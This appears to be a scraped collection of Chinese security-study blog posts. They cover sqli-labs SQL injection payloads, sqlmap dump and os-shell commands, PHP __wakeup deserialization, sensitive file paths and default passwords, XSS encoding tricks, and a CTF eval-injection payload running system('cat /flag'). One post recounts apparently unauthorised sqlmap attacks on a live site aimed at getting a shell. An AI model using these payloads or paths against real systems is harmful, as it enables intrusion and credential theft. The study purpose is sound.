第五十四关在这关当中，他是需要我们最后提交一个key，并且这个key是藏在一个新的库里面的，并且过了十秒钟后这个key就会刷新，我们看了一下源码，可以发现，**next_tryy();**就代表着时间，随意修改时间次数他其实需要两种传输方式POST：提交keyGET：获取id并且在KEY那一栏有了过滤使用了mysqli_real_escape_string以及addslashes两个函数进行过滤但是在id那一栏里面啥也没过滤，并且是以单引号进行闭合的。所以我们就在id那边进行注入思考：如果我们没看源代码，如何知道呢？题目黄字就说 input the id了 而下面的key现在只是在迷惑你哈哈 好的知道这些再来看源码 他是不报错的，在我们登录后 他是有跳出两个栏，所以我们试一下union拼接select 注入先用order by查询字段数，然后打一套组合拳就可以了payload：?id=-1’union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=’challenges’ –+接下来就是根据他的动态码去编写payload即可往后的关卡都是变形，没啥好说的。 sqlilabs做题小结：1.知道他是需要获取什么数据 是?sort 还是?id2.判断是否有注入点常见闭合形式：‘ ’‘ “ ’） ‘’）。。。。。。基于此变形，就是单引号和括号的组合判断手法&amp; 和| 还有 rand()3.order by后注入 还是直接 where后注入4.判断要使用什么注入手法：有报错——报错注入union可用——考虑union 拼接select除此以外——考虑文件上传注入（一句话木马），时间，布尔盲注是否有gbk编码，考虑宽字节注入是否有mysqli_multi_query 考虑堆栈注入 5.是否有waf需要绕过例如空格可以采取%a0 还有and or 大小写联合书写，或者重复书写，过滤单引号，根据过滤方式选择手段，是直接转义添加/还是直接去掉变成null，在书写select的时候可以将最后’库名’转化为十六进制进行书写0x***类似6.然后还有很多要学，继续努力","link":"/2020/12/08/sqlilabs8/"},{"title":"sqlmap学习","text":"get类型：1.查看是否有注入点：sqlmap -u 网址 2.出数据库名：sqlmap -u 网址 –dbs3.出数据库的表名：sqlmap -u 网址 -D security –tables4.出数据库的列名：sqlmap -u 网址 -D security -T users –columns5.出数据：sqlmap -u -D security -T users -C id,password,username –dump aaa POST类型使用burp抓包，将请求内容保存在txt文件中（或者使用-u 网址 –data ‘data’来代替）1.使用sqlmap检查是否存在注入点：sqlmap -r 文档位置2.使用sqlmap爆库名：sqlmap -r 文档位置 –dbs 设置线程这里需要先去配置文件改一下最大线程然后再命令的最后加上 –threads+数字 查看当前用户以及是否是dba用户–current-user 查看用户–is-dba 查看是否是dba–hostname 查看主机名–password暴力破解用户名密码 枚举dbms的权限–privileges –role 爬取url：–crawl=num（1，2，3，4：要爬取的深度） –os-shellhttps://mp.weixin.qq.com/s/f-iIm4u5CJo2niMgTor2EQ 1.写入shell的前提root权限，需要写文件的权限 select group_concat(user,0x3a,file_priv) from mysql.user;出现Y，这就代表你有文件权限，N就是没有 以下的就和在sqli-labs时写马的条件是一样的需要知道绝对路径 –os-shell sqlmap各种脚本使用说明：https://xz.aliyun.com/t/2746","link":"/2020/12/17/sqlmap%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99%E5%AD%A6%E4%B9%A0/"},{"title":"PHP序列化反序列化以及其中的漏洞（一）","text":"__wakeup()函数用法__wakeup()是用在反序列化操作中。unserialize()会检查存在一个__wakeup()方法。如果存在，则先会调用__wakeup()方法。 123456789&lt;?phpclass A{ function __wakeup(){ echo 'Hello'; } }$c = new A();$d=unserialize('O:1:&quot;A&quot;:0:{}');?&gt; 最后页面输出了Hello。在反序列化的时候存在__wakeup()函数，所以最后就会输出Hello__wakeup()函数漏洞说明 1234567891011121314&lt;?php class Student{ public $full_name = 'zhangsan'; public $score = 150; public $grades = array(); function __wakeup() { echo &quot;__wakeup is invoked&quot;; }}$s = new Student();var_dump(serialize($s));?&gt; 最后页面上输出的就是Student对象的一个序列化输出，O:7:&quot;Student&quot;:3:{s:9:&quot;full_name&quot;;s:8:&quot;zhangsan&quot;;s:5:&quot;score&quot;;i:150;s:6:&quot;grades&quot;;a:0:{}}。其中在Stuedent类后面有一个数字3，整个3表示的就是Student类存在3个属性。__wakeup()漏洞就是与整个属性个数值有关。当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过__wakeup的执行。当我们将上述的序列化的字符串中的对象属性修改为5，变为O:7:&quot;Student&quot;:5:{s:9:&quot;full_name&quot;;s:8:&quot;zhangsan&quot;;s:5:&quot;score&quot;;i:150;s:6:&quot;grades&quot;;a:0:{}}。最后执行运行的代码如下： 123456789101112131415class Student{ public $full_name = 'zhangsan'; public $score = 150; public $grades = array(); function __wakeup() { echo &quot;__wakeup is invoked&quot;; } function __destruct() { var_dump($this); }}$s = new Student();$stu = unserialize('O:7:&quot;Student&quot;:5:{s:9:&quot;full_name&quot;;s:8:&quot;zhangsan&quot;;s:5:&quot;score&quot;;i:150;s:6:&quot;grades&quot;;a:0:{}}'); 可以看到这样就成功地绕过了__wakeup()函数。 参考:https://blog.spoock.com/2016/11/03/php-wakeup/(还没完结，记得补)","link":"/2021/02/22/wakeup-%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E%E4%BB%A5%E5%8F%8A%E5%AE%9E%E9%99%85%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"},{"title":"window&#x2F;linux敏感目录整理","text":"0x01、配置文件查找文件如果能够命令执行，直接使用查找命令吧。。。 Linux 相关： 12345# 查找文件find / -name filename.ext# 全盘查找含有 flag 的文件grep flag -r / Windows 相关： 123456789# 全盘查找文件，一定要加一个星号！for /r c:\\ %i in (password.txt*) do @echo %ifor /r c:\\ %i in (*.ini) do @echo %i# 查找 C 盘中包含 password 字样的文件，一定要双引号！findstr /s /n &quot;password&quot; c:\\*# 查找 pwd.txt 中是否包含 password 字样，一定要双引号！find /N /I &quot;password&quot; pwd.txt 常见的配置文件名12345678910111213141516171819202122232425# apachehttpd.conf# MySQLmy.ini# 虚拟主机配置httpd-vhosts.conf# IISmetabase.xmlapplicationHost.config# ssh/etc/ssh/sshd_config# nginx/etc/nginx/nginx.conf/etc/nginx/sites-enabled/default# PHPphp.ini# weblogic 读密码./security/SerializedSystemIni.dat./config/config.xml Apache123456789101112# 配置文件路径/etc/httpd/conf/httpd.conf# 默认站点路径/var/www/html/# ubuntu 下配置文件/etc/apache2/apache2.conf# 访问日志和错误日志/private/var/log/apache2/error_log/private/var/log/apache2/access_log IIS12# 配置文件web.config MySQL123# 配置文件/etc/my.cnf/etc/mysql/my.cnf phpMyAdmin12345# 配置文件config.inc.php# 默认路径/var/www/phpmyadmin/config.inc.php XAMPP 建站相关路径 1234567891011121314151617181920212223242526272829303132333435363738394041424344# 网站默认路径xampp\\htdocs# Apache 基本配置xampp\\apache\\conf\\httpd.conf# Apache SSLxampp\\apache\\conf\\ssl.conf# Apache Perl（仅限插件）xampp\\apache\\conf\\perl.conf# Apache Tomcat（仅限插件）xampp\\apache\\conf\\java.conf# Apache Python（仅限插件）xampp\\apache\\conf\\python.conf# 虚拟主机xampp/apache/conf/extra/httpd-vhosts.conf# PHPxampp\\php\\php.ini# 数据库默认路径xampp\\mysql\\data# MySQLxampp\\mysql\\bin\\my.ini # phpMyAdminxampp\\phpMyAdmin\\config.inc.php# FileZilla FTP 服务器xampp\\FileZilla# FTP\\FileZilla Server.xml Mercury # 邮件服务器基本配置xampp\\MercuryMail\\MERCURY.INI # Sendmailxampp\\sendmail\\sendmail.ini 默认密码 1234567891011121314# MySQLUser: root Password:（空）# FileZilla FTPUser: newuser Password: wamppUser: anonymous Password: some@mail.net# MercuryPostmaster: postmaster (postmaster@localhost) Administrator: Admin (admin@localhost) TestUser: newuser Password: wampp # WEBDAVUser: wampp Password: xampp phpStudy 建站还记得几年前用 phpStudy 建站，贼费劲，可能是当时技术太差了，端口占用、数据库管理啥的都很乱，今天（2019年08月02日）在 Windows 上又搭了一次，发现啥问题也没遇到，技术、产品的更新换代真的太快了。 现在还出了个 pro 版本，所以路径也相对的有了变化，本文以 Pro 版为例，如果是普通版，去掉 Pro 即可。 相关路径 123456789# 根目录phpstudy\\WWWphpstudy_pro\\WWW# phpMyAdminphpstudy_pro\\WWW\\phpMyAdmin4.8.5# php：Pro 版本，以扩展的方式来显示插件。phpstudy_pro\\Extensions\\php\\php7.3.4nts\\php.ini Nginx1配置文件存放目录：/etc/nginx 主配置文件：/etc/nginx/conf/nginx.conf 管理脚本：/usr/lib64/systemd/system/nginx.service 模块：/usr/lisb64/nginx/modules 应用程序：/usr/sbin/nginx 程序默认存放位置：/usr/share/nginx/html 日志默认存放位置：/var/log/nginx 配置文件目录为：/usr/local/nginx/conf/nginx.conf 0x03、敏感文件探针等信息在使用 XAMPP/LAMPP/phpStudy/PHPnow 建站时，可能留下来一些探针页面，可以找到一些可用的信息，比如 Document_Root 代表网站根目录，session.save_path 存放 Session 信息。 123456789101.phpl.phpp.phpu.phtz.phptest.phpinfo.phpceshi.phptanzhen.phpphpinfo.php Windows1234567891011121314151617# 查看系统版本c:\\boot.ini# IIS配置文件c:\\windows\\system32\\inetsrv\\MetaBase.xml # 存储Windows系统初次安装的密码c:\\windows\\repair\\sam # MySQL配置c:\\ProgramFiles\\mysql\\my.ini # MySQL root密码c:\\ProgramFiles\\mysql\\data\\mysql\\user.MYD # php 配置信息c:\\windows\\php.ini linuxBasic Linux Privilege Escalation 1234567891011121314151617181920# 账户信息/etc/passwd# 账户密码文件/etc/shadow# Apache2默认配置文件/usr/local/app/apache2/conf/httpd.conf# 虚拟网站配置/usr/local/app/apache2/conf/extra/httpd-vhost.conf# PHP 配置文件/usr/local/app/php5/lib/php.ini# Apache 配置文件/etc/httpd/conf/httpd.conf# MySQL 配置文件/etc/my.conf 0x04、常见 CMSDeDeCms1234567/member/templets/menulit.php/plus/paycenter/alipay/return_url.php/plus/paycenter/cbpayment/autoreceive.php/paycenter/nps/config_pay_nps.php/plus/task/dede-maketimehtml.php/plus/task/dede-optimize-table.php/plus/task/dede-upcache.php WordPress12/wp-admin/includes/file.php/wp-content/themes/baiaogu-seo/footer.php Ecshop1234567891011121314151617181920212223242526272829303132333435363738394041424344454647/api/cron.php/wap/goods.php/temp/compiled/ur_here.lbi.php/temp/compiled/pages.lbi.php/temp/compiled/user_transaction.dwt.php/temp/compiled/history.lbi.php/temp/compiled/page_footer.lbi.php/temp/compiled/goods.dwt.php/temp/compiled/user_clips.dwt.php/temp/compiled/goods_article.lbi.php/temp/compiled/comments_list.lbi.php/temp/compiled/recommend_promotion.lbi.php/temp/compiled/search.dwt.php/temp/compiled/category_tree.lbi.php/temp/compiled/user_passport.dwt.php/temp/compiled/promotion_info.lbi.php/temp/compiled/user_menu.lbi.php/temp/compiled/message.dwt.php/temp/compiled/admin/pagefooter.htm.php/temp/compiled/admin/page.htm.php/temp/compiled/admin/start.htm.php/temp/compiled/admin/goods_search.htm.php/temp/compiled/admin/index.htm.php/temp/compiled/admin/order_list.htm.php/temp/compiled/admin/menu.htm.php/temp/compiled/admin/login.htm.php/temp/compiled/admin/message.htm.php/temp/compiled/admin/goods_list.htm.php/temp/compiled/admin/pageheader.htm.php/temp/compiled/admin/top.htm.php/temp/compiled/top10.lbi.php/temp/compiled/member_info.lbi.php/temp/compiled/bought_goods.lbi.php/temp/compiled/goods_related.lbi.php/temp/compiled/page_header.lbi.php/temp/compiled/goods_script.html.php/temp/compiled/index.dwt.php/temp/compiled/goods_fittings.lbi.php/temp/compiled/myship.dwt.php/temp/compiled/brands.lbi.php/temp/compiled/help.lbi.php/temp/compiled/goods_gallery.lbi.php/temp/compiled/comments.lbi.php/temp/compiled/myship.lbi.php/includes/fckeditor/editor/dialog/fck_spellerpages/spellerpages/server-scripts/spellchecker.php/includes/modules/cron/auto_manage.php/includes/modules/cron/ipdel.php PHP16812345/admin/inc/hack/count.php?job=list/admin/inc/hack/search.php?job=getcode/admin/inc/ajax/bencandy.php?job=do/cache/MysqlTime.txt/PHPcms2008-sp4 CMSeasy123/lib/mods/celive/menu_top.php/lib/default/ballot_act.php/lib/default/special_act.php 参考:https://my.oschina.net/u/4324366/blog/3442695","link":"/2021/02/19/window-linux%E6%95%8F%E6%84%9F%E7%9B%AE%E5%BD%95%E6%95%B4%E7%90%86/"},{"title":"国科安全渗透测试第一课","text":"国科安全第一课渗透测试思路：1.信息收集2.漏洞挖掘3.漏洞利用4.输出渗透测试报告渗透测试之信息收集 1.基本信息》域名信息 例:goktech.cn 工具:站长之家 Layer工具》子域名 例:bbs.goktech.cn》ip地址》同ip的其他网站信息(旁站) –站长之家》同网段的其他服务器信息（c段）》端口:(http80、https443)、445（共享端口（共享文件夹））》服务(web服务)，服务版本》信息泄露——github.com(开源代码网站) 2.os操作系统版本——Nmap工具（kali要有ip地址，并且和你的目标服务器网络可达（ping通），区分大小写）nmap -sn +域名/网段/ip地址 //-sP 用ping的方式判断是否有存货主机，不扫面端口//-sT 使用TCP进行连接，对目标主机所欲端口进行完整的三次握手，如果成功建立连接则说明端口开放**(TCP三次握手)**//-sU：使用UDP数据包经行扫描，返回UDP报文，则端口是开放的，返回不可达则处于过滤状态nmap -sT -O 目标ip地址（使用sT方式扫描目标主机信息（O代表检测操作系统信息））-p+端口号: 扫描指定端口例子：nmap -sS -p 80,443 +ip地址-sV：服务版本导出到指定文本：nmap -sT -p 3389 –open ip -oN 3.txtcat 3.txt linux、wind、mac3.web中间件(web程序，用来提供网页服务)类型:iis，apache、nginx、weblogic4.数据库以及版本类型、版本:mysql,mssql,oracle,access5.后端的脚本类型、版本php、jsp、asp、aspx 域名https://raw.githubusercontent.com/Hwwg/myphoto/master/20210125194711.pnghttp://whois.chinaz.com/goktech.cn子域名https://phpinfo.me/domain/","link":"/2021/01/25/%E5%9B%BD%E7%A7%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%AC%AC%E4%B8%80%E8%AF%BE/"},{"title":"正则表达式学习","text":"","link":"/2021/01/30/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%AD%A6%E4%B9%A0/"},{"title":"PHP学习","text":"PHP的基本语法123&lt;?phpPHP 代码?&gt; 展示一下实例 123&lt;?phpecho &quot;Hello World!&quot;;?&gt; PHP的变量作用域变量的作用域是脚本中变量可被引用/使用的部分。 PHP 有四种不同的变量作用域： local global static parameter 着重讲一下 global和static吧首先是global，在函数内部施加该命令，变量在函数内部可以引用函数外部的值 12345678910111213&lt;?php$x=5;$y=10;function myTest(){ global $x,$y; $y=$x+$y;}myTest();echo $y; // 输出 15?&gt; 接下来是static命令，就是你在对一个变量施加该命令后，该变量的值发生改变后，在下次使用该变量时，这个值的量已经不在是初始量，而是变化后的量 12345678910111213&lt;?phpfunction myTest(){ static $x=0; echo $x; $x++; echo PHP_EOL; // 换行符}myTest();myTest();myTest();?&gt; 输出的值是0 1 2 当我把static这个指令删除后，输出的值就变成了000 最后是echo和print输出语句格式都是”输出内容”，不过区别在于，echo可以这样:echo”输””出””代码”，而print 只能一次性输出","link":"/2020/10/06/PHP%E5%AD%A6%E4%B9%A0/"},{"title":"由xss引发的对于浏览器解码和编码流程认识","text":"前言:看到xss的编码绕过写法后，其实感觉很懵， 不知道为啥他要这样写，故决定去学习一下浏览器解码和编码的过程 浏览器的大致工作流程浏览器最早开始解析html，将标签转化为内容树上的DOM节点，然后此时还是无法识别出哪些被实体编码，接下来建立起DOM树，才可以识别哪些为实体编码，并将其解码，在此基础上，javascript DOM API参与进来，可以对DOM树进行修改，改变DOM树的结构和内容，而CSS主要负责解析外部CSS文件和style 的样式标签 DOM树参考:https://zh.javascript.info/dom-nodes 在知道大致的一个工作流程后，分析其中的编码解码过程: 解析流:在知道完大致工作流程后，我们理一下各个解析器发挥作用的顺序: html-&gt;url-&gt;javascript1&lt;a href=&quot;UserInput&quot;&gt;&lt;/a&gt; 在这个例子中：首先html解析器进行解析，并进行实体编码的解码，接下来如果在这个userinput中设计URL内容，那么url解析器会发先发挥作用，进行URL解码，如果URL资源是JavaScript类型，JavaScript解析器将会发挥作用，进行解码 html-&gt;javascript-&gt;url1&lt;a href=# onclick=&quot;window.open('UserInput')&quot;&gt;&lt;/a&gt; 在这里 还是先html进行解析，接下来onclick的值是有JavaScript解析器进行解析处理的，处理的是window.open中的input，此时设计URL的参数，URL解析器就会对其中的内容进行解码，并将其结果传回给JavaScript HTML解析HTML解析器作为一个状态机，它从输入流中获取字符并按照转换规则转换到另一种状态。在解析过程中，任何时候它只要遇到一个‘&lt;’符号（后面没有跟‘/’）符号就会进入标签开始符号，然后转变到标签名状态，最后是数据状态并释方当前标签的token，当解析器处于数据状态时，它会继续解析，每当发现一个完整的标签，就会释放一个token。在前面的工作流程中我们说到，在建立起DOM树后会识别哪些为实体编码，并将其解码。这里我们将深入讲解一下整个过程:字符实体分为三种:1.数据状态中的字符引用2.RCDATA状态中的字符引用3.属性值状态中的字符引用 数据状态中的字符引用这些状态中HTML字符实体将会从”&amp;#..”形式编码，对应的解码字符会被放入数据缓冲区中,例如:”&lt;”被编码为“&amp;#60”。当解析器遇到&amp;字符，它会知道这是”数据状态的字符引用”，因此会消耗一个字符引用，并释放出相应的token，但是这里的&lt;的token不会被理解是标签的开始，原因是解析器解析这个这个字符引用后不会转换到标签开始状态。字符实体：字符实体是一个转义序列，它定义了一般无法在文本内容中输入的单个字符或符号。一个字符实体以一个&amp;符号开始，后面跟着一个预定义的实体的名称，或是一个#符号以及字符的十进制数字HTML字符实体 一点思考:当我们输入的xss脚本语句中&lt;&gt;被转义成&amp;#60;的时候，那么我们的xss脚本将不起作用。 RCDATA状态中的字符引用：这里要提一下RCDATA的概念。要了解什么是RCDATA，我们先要了解另一个概念。在HTML中有五类元素： 1空元素(Void elements)，如&lt;area&gt;,&lt;br&gt;,&lt;base&gt;等等 2原始文本元素(Raw text elements)，有&lt;script&gt;和&lt;style&gt; 3RCDATA元素(RCDATA elements)，有&lt;textarea&gt;和&lt;title&gt; 4外部元素(Foreign elements)，例如MathML命名空间或者SVG命名空间的元素 5基本元素(Normal elements)，即除了以上4种元素以外的元素五类元素的区别如下： 1空元素，不能容纳任何内容（因为它们没有闭合标签，没有内容能够放在开始标签和闭合标签中间）。 2原始文本元素，可以容纳文本。 3RCDATA元素，可以容纳文本和字符引用。 4外部元素，可以容纳文本、字符引用、CDATA段、其他元素和注释 5基本元素，可以容纳文本、字符引用、其他元素和注释 在RCDATA状态中，唯一能够被解析进入标签开始状态的只有&lt;textarea&gt;和&lt;text&gt;等RCDATA元素，以为这如果有一个语句是： 1&lt;textarea&gt;&lt;script&gt;alert(6)&lt;/script&gt;&lt;/textarea&gt; 这个语句当中的alert是不会被执行的，因为&lt;script&gt;不会被解析为标签开始状态 CDATA元素。任何在CDATA元素中的内容将不会触发解析器创建开始标签。闭合CDATA元素的标志是“]]&gt;”序列。因此如果用户想逃出CDATA元素，就要用未经任何编码的“]]&gt;”序列，不然是不会逃出CDATA元素的。 URL解析12 &lt;a href=&quot;%6a%61%76%61%73%63%72%69%70%74:%61%6c%65%72%74%28%31%29&quot;&gt;&lt;/a&gt;URL encoded &quot;javascript:alert(1)&quot; 1234&lt;ahref=&quot;&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:%61%6c%65%72%74%28%32%29&quot;&gt;Character entity encoded &quot;javascript&quot; and URL encoded &quot;alert(2)&quot; 12&lt;a href=&quot;javascript%3aalert(3)&quot;&gt;&lt;/a&gt;URL encoded &quot;:&quot; 上面这三段代码中 只有中间那段会成功弹窗，原因是:URL资源类型必须是ASCII字母，不然就会进入无类型状态，该规则同样适应于那个“:”号,我们知道html经过解析文本，并会对其字符实体进行解码，而在第一段和第三段JavaScript没有被解码，所以不会被URL解析器所识别，所以不会被解码。 javascript解析在script块中的字符实体编码不会被解析:12&lt;script&gt;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116&amp;#40;&amp;#57;&amp;#41;&amp;#59&lt;/script&gt;Character entity encoded alert(9); js支持Unicode解析所在位置字符串中当Unicode转义序列存在于字符串中时，它只会被解释为正规字符，而不是单引号，双引号或者换行符这些能够打破字符串上下文的字符。这项内容清楚地写在ECMAScript中。因此，Unicode转义序列将永远不会破环字符串上下文，因为它们只能被解释成字符串常量。 标识符名称中什么是标识符？java语言中，对于变量，常量，函数，语句块也有名字，我们统统称之为标识符Java标识符类似于我们C语言中定义的变量，定义规则如下:https://blog.csdn.net/shuaigexiaobo/article/details/86617080如果unicode转义序列出现在标识符中，它会被解码并解释为标识符的一部分 12&lt;script&gt;\\u0061\\u006c\\u0065\\u0072\\u0074(10);&lt;/script&gt;Unicode Escape sequence encoded alert 控制字符中什么是控制字符？例如单引号、双引号、圆括号等，这里可以简单理解为C语言中我们打printf(“”)里面的这个双引号https://www.netinbag.com/cn/internet/what-is-a-control-character.html在unicode转义序列表示一个控制字符时，它们将不会被解释成一个控制字符，而是被解码解析为标识符名称或者字符串常量。例子： 123&lt;script&gt;\\u0061\\u006c\\u0065\\u0072\\u0074\\u0028\\u0031\\u0031\\u0029&lt;/script&gt;Unicode Escape sequence encoded alert(11)//这里不会弹窗是因为，这里的控制字符()被解码后失去其控制字符的属性了 123&lt;script&gt;alert('13\\u0027)&lt;/script&gt;Unicode escape sequence encoded ’//这里的是因为控制字符''被转义了 123&lt;button onclick=&quot;confirm('8\\u0027);&quot;&gt;Button&lt;/button&gt;Unicode escape sequence encoded '同样单引号 1234&lt;script&gt;\\u0061\\u006c\\u0065\\u0072\\u0074(\\u0031\\u0032)&lt;/script&gt;Unicode Escape sequence encoded alert and 12 这个也不许 解码后缺少单引号&lt;script&gt;\\u0061\\u006c\\u0065\\u0072\\u0074('\\u0031\\u0032')&lt;/script&gt;这样就对了 参考http://test.attacker-domain.com/browserparsing/answers.txthttp://bobao.360.cn/learning/detail/292.htmlhttps://www.hackersb.cn/hacker/85.htmlhttps://xz.aliyun.com/t/5863https://zh.javascript.info/dom-nodeshttp://xuelinf.github.io/2016/05/18/%E7%BC%96%E7%A0%81%E4%B8%8E%E8%A7%A3%E7%A0%81-%E6%B5%8F%E8%A7%88%E5%99%A8%E5%81%9A%E4%BA%86%E4%BB%80%E4%B9%88/ 小结身为一个菜鸟，感觉理清楚这些以后，对于之前XSS博客写的编码绕过终于能体会一些了，果然学东西还是不能学的不清不楚的","link":"/2021/01/29/%E7%94%B1xss%E5%BC%95%E5%8F%91%E7%9A%84%E5%AF%B9%E4%BA%8E%E6%B5%8F%E8%A7%88%E5%99%A8%E8%A7%A3%E7%A0%81%E5%92%8C%E7%BC%96%E7%A0%81%E6%B5%81%E7%A8%8B%E8%AE%A4%E8%AF%86/"},{"title":"虎符比赛wp——fat free框架注入漏洞审计学习","text":"前言赛后复现学习学习，今天主要学习一下通过审计构造注入语句 代码审计基本步骤入口文件——&gt;文件监控——&gt;正式审计 正式审计步骤我把审计分为安装前和安装后两个部分，安装前审完了之后我们就可以开始看网站的其他文件是否存在漏洞了，这个时候一般分为两种审计方式： 1.通过危险函数逆推是否用户可控2.通读所有代码3.黑盒+白盒 我一般都会用第一种或者第二种方式，第一种方式能够快速的找到漏洞但是漏的可能会多，第二种方式一般用在规模比较小的cms，因为文件较少，所以代码全看了也花不了多少功夫，第三种我很少用，我觉得这是新手审计的缺点，其实更应该黑盒+白盒一起用的，因为在黑盒里我们可能可以发现一些看代码的时候不注意的漏洞，比如越权/逻辑等漏洞。 分析源码目录 我们在这个步骤只需要对源码目录有个大概的了解，知道每个目录里放的是什么文件就行了，比如install目录放的安装文件，admin目录放的后台管理相关的文件，function目录放的网站运行时需要用到的方法的相关文件等。 分析过滤情况 在这个步骤我们要对源码的过滤情况进行分析，看看是全局过滤还是单独写某个函数用于对输入点一个个的过滤。 审计对象注意点危险函数五大特性1.能够执行任意代码的函数2.常见能够读取网络资源的函数3.能够执行系统命令或者调用外部程序的函数4.能够操作文件（读取、移动、删除）的函数5.能修改运行时候的上下文环境（覆盖变量/函数） 任意执行代码函数：1.把传入的字符串当做php代码直接执行: 2.引入文件执行php代码，php里引入文件执行代码的函数: 3.第3种是一些数据处理函数,它们存在支持回调函数类型的参数,这个参数可以传入函数的字符串名称,一旦这个参数可控,那么可能造成漏洞,这些函数的特征非常明显,参数类型是callback形式,审计的基本上就是看他们的回调函数是不是用字符串的形式传递,是否可控,在PHP里存在大量的这种函数,这里只举5个比较常见的 能够执行系统命令或者调用外部程序的函数能够执行系统命令或者调用外部程序的函数,这些函数使用不当容易引起命令注入,一般需要通常需要结合escapeshellcmd或escapeshellarg函数过滤传入的变量 能够操作文件(读写,移动,删除)的函数能够操作文件(读写,移动,删除)的函数,在审计的时候也要注意传入的变量是否可控,是否存在穿越目录,导致任意文件读写的情况 能够修改运行时候的上下文环境(覆盖变量/函数) 实战下载 fat-free框架源码，将题目换成源码 1234567891011121314&lt;?php// Kickstart the framework$f3=require('lib/base.php');$f3-&gt;set('DEBUG',1);if ((float)PCRE_VERSION&lt;8.0) trigger_error('PCRE version is out of date');// Load configurationhighlight_file(__FILE__);$a=$_GET['a'];unset($f3-&gt;$a);$f3-&gt;run(); 这边包含了一个base.php文件，所以我直接去base.php中查看，搜索下看看有没有危险函数：在clear()方法中查找到eval函数，于是传入参数，直接定位到这里面看看 12345var_dump($key);var_dump($this-&gt;compile('@hive'.$key,FALSE));$val=preg_replace('/^(\\$hive)/','$this-&gt;hive',$this-&gt;compile('@hive.'.$key,FALSE));var_dump('unset('.$val.');');eval('unset('.$val.');'); 这里画个重点其实之前在学C原因的时候也有这样的调试方法，可能是太久没写代码了，都给忘了，真是无语哈哈哈可以看到输入内容，此时直接在url上构造payload即可 如果不定位的话： 断点打在get语句，直接步入跟踪： 原来这个unset函数重新定义了： 继续跟进:进入clear方法中： key为我们传入的值 为cache就进入以下判断，看了一下 似乎没有对我们可以利用的函数：到了eval函数这里： 在这里进行正则匹配的过滤，但是看了一下其他的payload，说是有进行过滤，但是看了一下 发现没有呀，然后此时只需要对这里进行payload的构造就行了,整个流程还挺明确的，就是用户传入的值 会进入到clear()函数中，期间也没什么绕弯子的地方。。接下来需要做的就是构造payload闭合前面的内容实现eval命令执行: 1?a=a['/']);phpinfo( 由于后面会拼接回来一个);所以这里后面的内容可以不要，但是要执行其他命令要吧后面的内容给注释掉，所以payload为: 1xxxxxxxxxx ?a=a['/']);system('cat /flag');// 小结:关于收获：1.对于调试其实已经不算陌生了，拿到题目获得源码后其实我是有点无从下手的，感觉是太久没调试手生了，通过这题，以后就要记得调试的基操了，尤其是通过输出各个变量确定我们输入的值，从而达到成功构造出闭合语句的效果","link":"/2021/04/04/%E7%BA%A2%E8%B0%B7%E6%9D%AF-%E8%99%8E%E7%AC%A6%E6%AF%94%E8%B5%9Bwp/"},{"title":"记录一次不完全简单的渗透测试","text":"引语：之前打比赛之前，学长给我推了一个网站，让我去尝试拿shell,毕竟是第一次，还是学到了很多有用的东西，故记录一下。 SQL注入学长跟我说，存在sql注入点，并且给我推送的网页一打开，出现这两个框，刚刷完靶场的我，一看到这个就以为注入点在这里，在尝试了几次无果之后，决定利用sqlmap跑一下，利用跑POST的方法，跑了好几次，都没有任何结果，我不禁在想，也许注入点不在这里，并且继续用post的方法，在文本上的referer、cookie等处加*号，定点扫描注入点，但是都没有结果后来经过学长点醒，我回到网页在url上寻找，发现，当我切换英文的时候 这个?lang=4后面的数字发生了改变，猜想是不是在这里，后来用sqlmap跑了一下，果然在这里 以上是跑出来的数据库，不过我们的目标不是这个，而是拿shell 问题1：为什么我用post的方式跑refer的时候 跑不出来呢 sqlmap –os-shell反弹shell我记得在上一次的时候可以直接反弹，但是不知道为啥这次不行，大概是路径换了？所以需要寻找绝对路径","link":"/2021/01/14/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"title":"逆向入门（一）","text":"","link":"/2021/05/09/%E9%80%86%E5%90%91%E5%85%A5%E9%97%A8%EF%BC%88%E4%B8%80%EF%BC%89/"},{"title":"汇编学习","text":"1.1计算机系统概述硬件系统：构成计算机的各种物质实体的总和软件系统：计算机上全部可运行程序的总和 x86微处理器的结构指令执行单元EUEU部分负责指令的执行，由ALU、标志寄存器、通用寄存器、数据寄存器和EU控制单元组成，不与系统外线相连主要实现两种操作:1.根据指令进行算数/逻辑运算；2.EU计算出指令要求寻址单元地址的偏移量，送BIU，以形成一个20位的物理地址，到存储器存取所要求的的操作数 总线接口单元BIUBIU负责与存储器接口——CPU和存储器之间的信息传送由地址加法器、段寄存器（CS、DS、ES、SS）、指令指针IP、指令队列和总线控制逻辑组成。 和指令队列之间的合作指令队列是一个6字节的寄存器，队列中同时最多可存6个字节指令、是一个先进先出的栈。当指令队列空的时候，BIU自动执行总线操作，取指令存入指令队列。当程序发生转义的时候，则BIU要重新取出指令，这是 BIU取出的指令将直接送EU执行，然后BIU将不断取指令填入指令队列中，当指令有写存储器要求，则通知BIU，由BIU把指令结果写到存储器中，然后再去指令到指令队列中 X86寄存器数据寄存器、指针及变址寄存器、段寄存器、控制寄存器 1.数据寄存器包括AX、BC、CX和DX四个通用寄存器，它们用来暂时存放运算过程中所用到的操作数、结果数据或其他信息，既可以以16位字长的形式来使用，也可以用8位字节的形式使用 AX作为累加器，自乘时提供一个操作数并存放积的低位，字除时提供被除数的低位并存放商。另外，所有的输入输出指令都是用这一寄存器与外部设备传送信息 BX可以用作通用寄存器；在计算存储器地址时，它经常用作基址寄存器；在XLAT指令中提供被查表格中源操作数的间接地址 2.指针及变址寄存器SP、BP、SI、DI四个十六位寄存器 